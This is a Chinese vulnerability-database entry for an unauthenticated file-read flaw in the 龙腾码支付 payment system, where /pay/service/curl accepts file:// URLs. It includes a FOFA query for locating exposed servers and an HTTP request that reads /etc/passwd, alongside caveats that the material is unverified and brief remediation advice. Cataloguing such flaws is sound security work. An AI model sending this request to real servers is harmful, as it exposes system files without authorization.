---
source: "SourByte05/Vulnerability-Wiki-PoC"
title: "龙腾码支付 pay/service/curl file协议读取"
product: "龙腾码支付"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "未知版本，服务端curl支持file协议/Linux文件权限"
prerequisites: "未授权声称"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://github.com/SourByte05/Vulnerability-Wiki-PoC"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E9%BE%99%E8%85%BE%E7%A0%81%E6%94%AF%E4%BB%98/%E9%BE%99%E8%85%BE%E7%A0%81%E6%94%AF%E4%BB%98%20payservicecurl%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md"
fofa: "body=\"/epaydoc/epaydoc.php\" && body=\"/sdk\""
fofa_unverified: "body="
id: "vw-0368a2c313a598728974d0dc"
entity_id: "ve-0368a2c313a598728974d0dc"
schema_version: "1"
---

# 龙腾码支付 pay/service/curl file协议读取

## 条目说明

- 对象与具体问题：龙腾码支付；pay/service/curl file协议读取
- 版本、配置及部署条件：未知版本，服务端curl支持file协议/Linux文件权限
- 认证与权限前提：未授权声称
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 更精确可记SSRF/不安全URL协议导致本地文件读取，需根因确认
- 只有passwd例及未视检图，无返回语义或读取限制；不能据泛风险表称在野已知
- 缺补丁/版本，标题路由缺斜杠、任读取错字

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

## 漏洞描述

龙腾码支付 /pay/service/curl 任意文件读取漏洞，未授权攻击者可进行任读取服务器文件，导致信息泄露。

## 影响版本

龙腾码支付

## **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 原文提供部分细节 | 见技术资料 | 未独立核验 | 待来源核实 |

### 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

## 漏洞复现

FOFA：body="/epaydoc/epaydoc.php" && body="/sdk"

POC/EXP：

```http
GET /pay/service/curl?url=file:///etc/passwd HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

![image-20250311164610359](./.resource/龙腾码支付payservicecurl任意文件读取漏洞/media/image-20250311164610359.png)


## 漏洞修复

关闭互联网暴露面或接口设置访问权限

升级至安全版本


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
